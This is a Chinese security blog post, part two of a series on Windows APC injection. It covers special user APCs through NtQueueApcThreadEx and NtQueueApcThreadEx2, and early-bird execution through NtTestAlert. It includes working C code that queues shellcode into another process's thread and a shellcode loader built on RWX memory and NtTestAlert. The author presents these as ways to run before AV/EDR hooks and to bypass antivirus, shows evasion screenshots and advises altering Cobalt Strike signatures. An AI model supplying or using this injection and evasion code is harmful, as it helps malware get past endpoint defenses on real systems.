> 原文链接: https://www.anquanke.com//post/id/252487 


# 深入理解APC机制（二）


                                阅读量   
                                **19137**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0178b919fb5c17d3b6.jpg)](https://p3.ssl.qhimg.com/t0178b919fb5c17d3b6.jpg)



## 0x01NtQueueApcThreadEx 之特殊用户 APC

​ 正如我上一篇所说，每个线程都有自己的 APC 队列。如果线程进入警报状态，它将开始以先进先出 (FIFO) 的形式执行 APC 作业。线程可以通过使用**SleepEx**、**SignalObjectAndWait**、**MsgWaitForMultipleObjectsEx**、**WaitForMultipleObjectsEx**或**WaitForSingleObjectEx**函数进入警报状态。

```
+---------------------+                                                 +---------------------+       
|                     |                                                 |                     |       
|                     |                                                 |                     |       
|                     |                                                 |                     |       
|   Malware Process   |                                                 |   svchost process   |       
|                     |               1 allocating space                |                     |       
|                     |-----------------------------------------------&gt; |---------------------|       
|                     |                                                 |                     |       
|                     |                                                 |      shellcode      |       
|                     |               2 writing shellcode               |                     |       
+---------------------+-----------------------------------------------&gt; +---------------------+       
           |                                                                     ^                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     v                    
           |                                                     +-----------------------------+      
           |                                                     |                             |      
           |                                                     |                             |      
           |                                                     |         thread 1112         |      
           |                                                     |                             |      
           |                                                     |-----------------------------|      
           |                                                     |              |              |      
           |             3 Queue an APC to thread 1112           |exec shellcode|other jobs... |      
           +----------------------------------------------------&gt;|              |              |      
                                                                 +-----------------------------+      
                                                                           APC Queue

```

而在 [Windows RS5](https://docs.microsoft.com/en-us/windows-insider/archive/new-in-rs5) 中，微软实现了特殊用户 APC。特殊用户 APC 可用于强制线程执行 APC 例程，即使它未处于警报状态。我们使用特殊用户 APC 进行 APC 注入所采取的所有步骤都类似于简单 APC 注入。唯一的区别是在这种情况下我们不会对所有线程进行 APC。可以使用**NtQueueApcThreadEx**函数将一个特殊的 APC 排队到属于我们目标进程的第一个线程。可以查看reactos文档中的实现：[https://doxygen.reactos.org/da/d3c/ntoskrnl_2ps_2state_8c_source.html#l00549](https://doxygen.reactos.org/da/d3c/ntoskrnl_2ps_2state_8c_source.html#l00549)

```
typedef enum _QUEUE_USER_APC_FLAGS `{`
    QueueUserApcFlagsNone,
    QueueUserApcFlagsSpecialUserApc,
    QueueUserApcFlagsMaxValue
`}` QUEUE_USER_APC_FLAGS;


typedef union _USER_APC_OPTION `{`
    ULONG_PTR UserApcFlags;
    HANDLE MemoryReserveHandle;
`}` USER_APC_OPTION, *PUSER_APC_OPTION;

USER_APC_OPTION UserApcOption;
UserApcOption.UserApcFlags = QueueUserApcFlagsSpecialUserApc;

for (Thread32First(snapshot, &amp;te); Thread32Next(snapshot, &amp;te);) `{`
    if (te.th32OwnerProcessID == target_process_id) `{`


        HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);

        NtQueueApcThreadEx(target_thread_handle, QueueUserApcFlagsSpecialUserApc, (PKNORMAL_ROUTINE)target_process_buffer, NULL, NULL, NULL);

        CloseHandle(target_thread_handle);
        break;

    `}`
`}`
```

​

## 0x02 NtQueueApcThreadEx2

在 windows insider build 19603 的某个版本，添加了两个重要的功能：
1. NtQueueApcThreadEx2：这是一个新的系统调用，它允许传递 UserApcFlags 和 MemoryReserveHandle。
1. QueueUserAPC2：这是kernelbase.dll中的一个新包装函数，允许用户访问特殊用户APC。
微软允许客户端会使用QueueUserAPC2 ，它可用于在执行过程中向线程发送信号——例如模拟类似于 Linux 如何向线程发送信号[(pthread_cancel) 的](http://man7.org/linux/man-pages/man3/pthread_cancel.3.html)信号机制。

```
NTSTATUS
NtQueueApcThreadEx2(
    IN HANDLE ThreadHandle,
    IN HANDLE UserApcReserveHandle,
    IN QUEUE_USER_APC_FLAGS QueueUserApcFlags,
    IN PPS_APC_ROUTINE ApcRoutine,
    IN PVOID SystemArgument1 OPTIONAL,
    IN PVOID SystemArgument2 OPTIONAL,
    IN PVOID SystemArgument3 OPTIONAL
    );


DWORD
QueueUserApc2(
    PAPCFUNC pfnAPC,
    HANDLE hThread,
    ULONG_PTR dwData,
    QUEUE_USER_APC_FLAGS Flags
    );
```



## 0x03 NtTestAlert

​ 我们知道线程只有在进入alertable状态时才能运行 APC 作业。那是否有不用alertable状态运行 APC 作业的方法。还真有一个就是**NtTestAlert**函数，它检查当前线程的 APC 队列，如果有任何排队的作业，它会运行它们以清空队列。当一个线程启动时，**NtTestAlert**会被首先调用在执行下面流程。因此，如果在线程的开始状态将 APC 排队，就可以安全地运行。其中它的底层调用是KeTestAlertThread:

```
BOOLEAN
 NTAPI
 KeTestAlertThread(IN KPROCESSOR_MODE AlertMode)
 `{`
     PKTHREAD Thread = KeGetCurrentThread();
     BOOLEAN OldState;
     KLOCK_QUEUE_HANDLE ApcLock;
     ASSERT_THREAD(Thread);
     ASSERT_IRQL_LESS_OR_EQUAL(DISPATCH_LEVEL);

     /* Lock the Dispatcher Database and the APC Queue */
     KiAcquireApcLockRaiseToSynch(Thread, &amp;ApcLock);

     /* Save the old State */
     OldState = Thread-&gt;Alerted[AlertMode];

     /* Check the Thread is alerted */
     if (OldState)
     `{`
         /* Disable alert for this mode */
         Thread-&gt;Alerted[AlertMode] = FALSE;
     `}`
     else if ((AlertMode != KernelMode) &amp;&amp;
              (!IsListEmpty(&amp;Thread-&gt;ApcState.ApcListHead[UserMode])))
     `{`
         /* If the mode is User and the Queue isn't empty, set Pending */
         Thread-&gt;ApcState.UserApcPending = TRUE;
     `}`

     /* Release Locks and return the Old State */
     KiReleaseApcLock(&amp;ApcLock);
     return OldState;
 `}`
```

​ 我们首先创建一个处于挂起状态的进程（如 svchost），然后将 APC 排队到主线程，然后恢复线程。因此，在线程开始执行主代码之前，它会调用**NtTestAlert**函数来清空当前线程的 APC 队列并运行排队的作业。因为它会在 AV/EDR hook新进程前运行。demo如下：

```
#include &lt;Windows.h&gt;

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

int main()
`{`
    unsigned char buf[] = "xx";
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    SIZE_T shellSize = sizeof(buf);
    LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    testAlert();

    return 0;
`}`
```

这里我采用了文件分离的方式，免杀效果：

[![](https://p1.ssl.qhimg.com/t016ebd21583540d694.png)](https://p1.ssl.qhimg.com/t016ebd21583540d694.png)

[![](https://p5.ssl.qhimg.com/t012ee75583d611a313.png)](https://p5.ssl.qhimg.com/t012ee75583d611a313.png)



## 0x04 总结

​ 网上使用这些的方式也有很多代码了，在我实际的渗透测试过程中比较倾向使用NtQueueApcThreadEx与NtTestAlert，绕过各种杀软的效果都挺可以，如果你还是显示被杀，可以先测试正常的弹计算器的shellcode是否正常。有些可能是比如CS的特征行为被杀，就需要改一下CS。
